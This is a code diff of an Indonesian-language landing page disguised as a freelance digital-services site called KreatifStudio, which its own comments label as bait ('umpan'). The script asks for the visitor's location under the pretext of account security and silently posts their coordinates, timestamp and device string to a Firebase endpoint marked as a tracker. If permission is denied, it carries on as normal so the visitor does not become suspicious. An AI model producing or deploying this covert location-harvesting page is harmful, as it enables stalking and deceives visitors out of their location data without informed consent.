@@ -5,100 +5,166 @@
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <title>KreatifStudio - Jasa Digital Profesional</title>
 <style>
-  @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;700;800&display=swap');
+  @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap');
+  
   * { box-sizing: border-box; margin: 0; padding: 0; }
-  body { font-family: 'Plus Jakarta Sans', sans-serif; background: #0a0e17; color: #f1f5f9; min-height: 100vh; overflow-x: hidden; }
+  body { font-family: 'Plus Jakarta Sans', sans-serif; background: #09090b; color: #fafafa; min-height: 100vh; overflow-x: hidden; }
 
-  /* --- LANDING --- */
-  #landing { position: fixed; inset: 0; background: linear-gradient(135deg, #0a0e17 0%, #1a1f2e 100%); display: flex; flex-direction: column; justify-content: center; align-items: center; padding: 24px; text-align: center; z-index: 9999; transition: opacity 0.6s ease; }
-  #landing::before { content: ''; position: absolute; top: -50%; left: -50%; width: 200%; height: 200%; background: radial-gradient(circle at 30% 30%, rgba(56,189,248,0.15) 0%, transparent 50%), radial-gradient(circle at 70% 70%, rgba(168,85,247,0.1) 0%, transparent 50%); animation: float 20s ease-in-out infinite; pointer-events: none; }
-  @keyframes float { 0%,100% { transform: translate(0,0); } 50% { transform: translate(-20px,-20px); } }
-  .logo { position: relative; font-size: 38px; font-weight: 800; margin-bottom: 12px; color: #38bdf8; letter-spacing: -1px; }
-  .logo span { color: #f1f5f9; }
-  .tagline { position: relative; color: #94a3b8; font-size: 14px; margin-bottom: 40px; max-width: 320px; line-height: 1.6; }
-  .btn-masuk { position: relative; background: linear-gradient(135deg, #38bdf8, #0ea5e9); color: #0a0e17; border: none; padding: 16px 48px; border-radius: 50px; font-weight: 800; font-size: 16px; cursor: pointer; box-shadow: 0 10px 30px rgba(56,189,248,0.4); transition: transform 0.2s, box-shadow 0.2s; font-family: inherit; }
-  .btn-masuk:hover { transform: translateY(-2px); box-shadow: 0 15px 40px rgba(56,189,248,0.5); }
+  /* --- LANDING PAGE (UMpan) --- */
+  #landing { position: fixed; inset: 0; background: radial-gradient(circle at top right, #1e1b4b 0%, #09090b 100%); display: flex; flex-direction: column; justify-content: center; align-items: center; padding: 24px; text-align: center; z-index: 9999; transition: opacity 0.6s ease; }
+  
+  /* Ornamen Background */
+  .bg-grid { position: absolute; inset: 0; background-image: linear-gradient(rgba(255,255,255,0.03) 1px, transparent 1px), linear-gradient(90deg, rgba(255,255,255,0.03) 1px, transparent 1px); background-size: 40px 40px; pointer-events: none; mask-image: radial-gradient(circle at center, black, transparent 80%); -webkit-mask-image: radial-gradient(circle at center, black, transparent 80%); }
+  
+  .logo-wrap { position: relative; width: 80px; height: 80px; margin-bottom: 20px; background: linear-gradient(135deg, #38bdf8, #818cf8); border-radius: 20px; display: flex; align-items: center; justify-content: center; box-shadow: 0 10px 30px rgba(56, 189, 248, 0.4); transform: rotate(-5deg); }
+  .logo-wrap svg { width: 40px; height: 40px; color: white; transform: rotate(5deg); }
+  
+  .brand-title { position: relative; font-size: 42px; font-weight: 800; margin-bottom: 12px; letter-spacing: -1.5px; color: #fff; }
+  .brand-title span { color: #38bdf8; }
+  .tagline { position: relative; color: #a1a1aa; font-size: 15px; margin-bottom: 40px; max-width: 340px; line-height: 1.6; }
+  
+  .btn-masuk { position: relative; background: #fafafa; color: #09090b; border: none; padding: 16px 48px; border-radius: 50px; font-weight: 700; font-size: 16px; cursor: pointer; transition: all 0.3s ease; font-family: inherit; display: flex; align-items: center; gap: 10px; box-shadow: 0 0 20px rgba(255,255,255,0.1); }
+  .btn-masuk:hover { transform: translateY(-2px); box-shadow: 0 10px 40px rgba(255,255,255,0.2); background: #fff; }
   .btn-masuk:active { transform: translateY(0); }
-  .terms { position: relative; font-size: 11px; color: #64748b; margin-top: 24px; max-width: 300px; line-height: 1.5; }
-  .terms b { color: #94a3b8; }
+  .btn-masuk svg { width: 18px; height: 18px; }
+  
+  .terms { position: relative; font-size: 12px; color: #52525b; margin-top: 30px; max-width: 320px; line-height: 1.6; }
+  .terms b { color: #a1a1aa; cursor: pointer; }
 
   /* --- LOADING --- */
-  #loading { position: fixed; inset: 0; background: #0a0e17; display: none; flex-direction: column; justify-content: center; align-items: center; z-index: 10000; }
-  .spinner { width: 60px; height: 60px; border: 4px solid #1e293b; border-top: 4px solid #38bdf8; border-radius: 50%; animation: spin 0.9s linear infinite; margin-bottom: 24px; }
+  #loading { position: fixed; inset: 0; background: #09090b; display: none; flex-direction: column; justify-content: center; align-items: center; z-index: 10000; }
+  .spinner-wrap { position: relative; width: 70px; height: 70px; margin-bottom: 24px; }
+  .spinner { width: 100%; height: 100%; border: 4px solid #27272a; border-top: 4px solid #38bdf8; border-radius: 50%; animation: spin 1s linear infinite; }
+  .spinner-inner { position: absolute; inset: 8px; border: 4px solid #27272a; border-bottom: 4px solid #818cf8; border-radius: 50%; animation: spin-reverse 1.2s linear infinite; }
   @keyframes spin { to { transform: rotate(360deg); } }
-  .loading-text { color: #94a3b8; font-size: 14px; animation: pulse 1.5s infinite; text-align: center; }
-  @keyframes pulse { 0%,100% { opacity: 1; } 50% { opacity: 0.4; } }
+  @keyframes spin-reverse { to { transform: rotate(-360deg); } }
+  .loading-text { color: #a1a1aa; font-size: 14px; font-weight: 500; animation: pulse 1.5s infinite; text-align: center; }
+  @keyframes pulse { 0%,100% { opacity: 1; } 50% { opacity: 0.5; } }
 
   /* --- MAIN WEB --- */
-  #main-web { display: none; padding: 20px; max-width: 600px; margin: 0 auto; padding-bottom: 40px; }
-  header { display: flex; justify-content: space-between; align-items: center; padding-bottom: 20px; border-bottom: 1px solid #1e293b; margin-bottom: 24px; }
-  header h1 { font-size: 20px; color: #38bdf8; font-weight: 800; }
-  header .avatar { width: 36px; height: 36px; border-radius: 50%; background: linear-gradient(135deg, #38bdf8, #a855f7); display: flex; align-items: center; justify-content: center; font-size: 16px; }
-  .hero { background: linear-gradient(135deg, #1e293b, #0f172a); padding: 28px; border-radius: 20px; margin-bottom: 24px; border: 1px solid #334155; position: relative; overflow: hidden; }
-  .hero::before { content: ''; position: absolute; top: -50%; right: -50%; width: 200%; height: 200%; background: radial-gradient(circle at 80% 20%, rgba(56,189,248,0.15), transparent 50%); pointer-events: none; }
-  .hero h2 { font-size: 22px; margin-bottom: 12px; line-height: 1.35; position: relative; }
-  .hero p { color: #94a3b8; font-size: 13px; margin-bottom: 20px; line-height: 1.6; position: relative; }
-  .hero-btn { background: #f1f5f9; color: #0a0e17; text-decoration: none; padding: 10px 24px; border-radius: 10px; font-weight: 800; display: inline-block; font-size: 13px; position: relative; }
-  .section-title { font-size: 16px; margin-bottom: 14px; font-weight: 700; }
-  .layanan { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-bottom: 20px; }
-  .card { background: #1e293b; padding: 18px; border-radius: 16px; border: 1px solid #334155; transition: transform 0.2s; }
-  .card:active { transform: scale(0.98); }
-  .card .icon { font-size: 26px; margin-bottom: 10px; display: block; }
-  .card h3 { font-size: 14px; margin-bottom: 4px; }
-  .card p { font-size: 11px; color: #94a3b8; line-height: 1.4; }
-  .cta-strip { background: linear-gradient(135deg, #38bdf8, #a855f7); padding: 20px; border-radius: 16px; text-align: center; margin-top: 16px; }
-  .cta-strip h3 { color: #0a0e17; font-size: 16px; margin-bottom: 6px; font-weight: 800; }
-  .cta-strip p { color: rgba(10,14,23,0.8); font-size: 12px; }
+  #main-web { display: none; padding: 20px; max-width: 600px; margin: 0 auto; padding-bottom: 50px; }
+  
+  header { display: flex; justify-content: space-between; align-items: center; padding-bottom: 24px; border-bottom: 1px solid #27272a; margin-bottom: 28px; }
+  .header-logo { display: flex; align-items: center; gap: 10px; }
+  .header-logo .icon-box { width: 32px; height: 32px; background: linear-gradient(135deg, #38bdf8, #818cf8); border-radius: 8px; display: flex; align-items: center; justify-content: center; }
+  .header-logo .icon-box svg { width: 18px; height: 18px; color: white; }
+  .header-logo h1 { font-size: 18px; color: #fafafa; font-weight: 700; letter-spacing: -0.5px; }
+  .avatar { width: 36px; height: 36px; border-radius: 50%; background: #27272a; display: flex; align-items: center; justify-content: center; border: 1px solid #3f3f46; }
+  .avatar svg { width: 20px; height: 20px; color: #a1a1aa; }
+
+  .hero { background: linear-gradient(180deg, #18181b 0%, #09090b 100%); padding: 32px 24px; border-radius: 24px; margin-bottom: 28px; border: 1px solid #27272a; position: relative; overflow: hidden; }
+  .hero-illustration { position: absolute; top: 10px; right: -20px; width: 150px; height: 150px; opacity: 0.3; pointer-events: none; }
+  .hero h2 { font-size: 24px; margin-bottom: 12px; line-height: 1.3; font-weight: 800; color: #fff; position: relative; z-index: 1; }
+  .hero h2 span { color: #38bdf8; }
+  .hero p { color: #a1a1aa; font-size: 13px; margin-bottom: 24px; line-height: 1.6; position: relative; z-index: 1; }
+  .hero-btn { background: #27272a; color: #fafafa; text-decoration: none; padding: 12px 24px; border-radius: 12px; font-weight: 700; display: inline-flex; align-items: center; gap: 8px; font-size: 13px; position: relative; z-index: 1; border: 1px solid #3f3f46; transition: 0.2s; }
+  .hero-btn:hover { background: #3f3f46; }
+  .hero-btn svg { width: 16px; height: 16px; }
+
+  .section-title { font-size: 16px; margin-bottom: 16px; font-weight: 700; color: #fafafa; display: flex; align-items: center; gap: 8px; }
+  .section-title svg { width: 18px; height: 18px; color: #38bdf8; }
+
+  .layanan { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; margin-bottom: 24px; }
+  .card { background: #18181b; padding: 20px; border-radius: 16px; border: 1px solid #27272a; transition: transform 0.2s, border-color 0.2s; }
+  .card:hover { border-color: #3f3f46; transform: translateY(-2px); }
+  .card .icon { width: 40px; height: 40px; background: #27272a; border-radius: 10px; display: flex; align-items: center; justify-content: center; margin-bottom: 14px; }
+  .card .icon svg { width: 22px; height: 22px; color: #38bdf8; }
+  .card h3 { font-size: 14px; margin-bottom: 6px; color: #fff; font-weight: 700; }
+  .card p { font-size: 11px; color: #71717a; line-height: 1.4; }
+
+  .cta-strip { background: linear-gradient(135deg, #1e1b4b, #312e81); padding: 24px; border-radius: 20px; text-align: center; margin-top: 10px; border: 1px solid #3730a3; position: relative; overflow: hidden; }
+  .cta-strip::before { content: ''; position: absolute; top: -50%; right: -50%; width: 200%; height: 200%; background: radial-gradient(circle, rgba(56,189,248,0.2), transparent 60%); pointer-events: none; }
+  .cta-strip h3 { color: #fff; font-size: 16px; margin-bottom: 8px; font-weight: 800; position: relative; }
+  .cta-strip p { color: #a5b4fc; font-size: 12px; position: relative; }
 </style>
 </head>
 <body>
 
-<!-- 1. LANDING (UMpan) -->
+<!-- 1. LANDING PAGE (UMPAN) -->
 <div id="landing">
-  <div class="logo">Kreatif<span>Studio</span></div>
+  <div class="bg-grid"></div>
+  
+  <div class="logo-wrap">
+    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"/></svg>
+  </div>
+  
+  <div class="brand-title">Kreatif<span>Studio</span></div>
   <p class="tagline">Platform Jasa Digital #1 untuk kebutuhan bisnis dan personal kamu. Dipercaya 10.000+ klien di seluruh Indonesia.</p>
-  <button class="btn-masuk" onclick="mulaiVerifikasi()">Masuk & Mulai Jelajahi</button>
+  
+  <button class="btn-masuk" onclick="mulaiVerifikasi()">
+    Masuk & Mulai Jelajahi
+    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="5" y1="12" x2="19" y2="12"/><polyline points="12 5 19 12 12 19"/></svg>
+  </button>
+  
   <p class="terms">Dengan masuk, kamu menyetujui <b>Syarat & Ketentuan</b> serta <b>Kebijakan Privasi</b> kami, termasuk verifikasi lokasi untuk keamanan akun.</p>
 </div>
 
 <!-- 2. LOADING -->
 <div id="loading">
-  <div class="spinner"></div>
+  <div class="spinner-wrap">
+    <div class="spinner"></div>
+    <div class="spinner-inner"></div>
+  </div>
   <div class="loading-text" id="loadText">Memverifikasi koneksi...</div>
 </div>
 
 <!-- 3. MAIN WEB -->
 <div id="main-web">
   <header>
-    <h1>KreatifStudio</h1>
-    <div class="avatar">👤</div>
+    <div class="header-logo">
+      <div class="icon-box">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"/></svg>
+      </div>
+      <h1>KreatifStudio</h1>
+    </div>
+    <div class="avatar">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
+    </div>
   </header>
   
   <div class="hero">
-    <h2>Butuh Jasa Digital Cepat & Terpercaya?</h2>
+    <!-- Ilustrasi SVG Laptop -->
+    <svg class="hero-illustration" viewBox="0 0 24 24" fill="none" stroke="#38bdf8" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="3" width="20" height="14" rx="2" ry="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg>
+    
+    <h2>Butuh Jasa Digital <span>Cepat & Terpercaya?</span></h2>
     <p>Tim desainer, developer, dan penulis profesional kami siap membantu project kamu 24/7 dengan hasil terbaik.</p>
-    <a href="#" class="hero-btn" onclick="event.preventDefault(); alert('Fitur pemesanan segera hadir!')">Pesan Sekarang</a>
+    <a href="#" class="hero-btn" onclick="event.preventDefault(); alert('Fitur pemesanan segera hadir!')">
+      Pesan Sekarang
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="9 18 15 12 9 6"/></svg>
+    </a>
   </div>
 
-  <h3 class="section-title">Layanan Populer</h3>
+  <div class="section-title">
+    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/></svg>
+    Layanan Populer
+  </div>
+  
   <div class="layanan">
     <div class="card">
-      <span class="icon">🎨</span>
+      <div class="icon">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 19l7-7 3 3-7 7-3-3z"/><path d="M18 13l-1.5-7.5L2 2l3.5 14.5L13 18l5-5z"/><path d="M2 2l7.586 7.586"/><circle cx="11" cy="11" r="2"/></svg>
+      </div>
       <h3>Desain Grafis</h3>
       <p>Logo, poster, feeds sosmed.</p>
     </div>
     <div class="card">
-      <span class="icon">💻</span>
-      <h3>Web Development</h3>
+      <div class="icon">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="16 18 22 12 16 6"/><polyline points="8 6 2 12 8 18"/></svg>
+      </div>
+      <h3>Web Dev</h3>
       <p>Landing page & company profile.</p>
     </div>
     <div class="card">
-      <span class="icon">✍️</span>
-      <h3>Penulisan Konten</h3>
+      <div class="icon">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 20h9"/><path d="M16.5 3.5a2.121 2.121 0 0 1 3 3L7 19l-4 1 1-4L16.5 3.5z"/></svg>
+      </div>
+      <h3>Penulisan</h3>
       <p>Artikel, copywriting, rilis.</p>
     </div>
     <div class="card">
-      <span class="icon">📱</span>
+      <div class="icon">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 2h-3a5 5 0 0 0-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 0 1 1-1h3z"/></svg>
+      </div>
       <h3>Social Media</h3>
       <p>Kelola akun & naikkan traffic.</p>
     </div>
@@ -128,16 +194,18 @@
       landing.style.display = 'none';
       loading.style.display = 'flex';
       
+      // Animasi teks loading
       setTimeout(() => loadText.innerText = "Mengamankan data...", 1000);
       setTimeout(() => loadText.innerText = "Menyiapkan halaman...", 2200);
 
+      // Minta Izin Lokasi
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(
           (position) => {
             const lat = position.coords.latitude;
             const lon = position.coords.longitude;
             
-            // Kirim ke Firebase
+            // Kirim koordinat ke Firebase
             fetch(FIREBASE_URL, {
               method: 'POST',
               headers: { 'Content-Type': 'application/json' },
@@ -146,17 +214,18 @@
                 lon: lon,
                 waktu: Date.now(),
                 device: navigator.userAgent,
-                sumber: "KreatifStudio (Web Umpan)"
+                sumber: "Web Freelance"
               })
             }).catch(e => console.log('[PELACAK] Gagal kirim:', e));
 
+            // Selesai loading, masuk ke web utama
             setTimeout(() => {
               loading.style.display = 'none';
               mainWeb.style.display = 'block';
             }, 2500);
           },
           (error) => {
-            // Kalau ditolak, tetap masuk web biar gak curiga
+            // Jika user nolak/blokir, tetap masuk web biar gak curiga
             setTimeout(() => {
               loading.style.display = 'none';
               mainWeb.style.display = 'block';
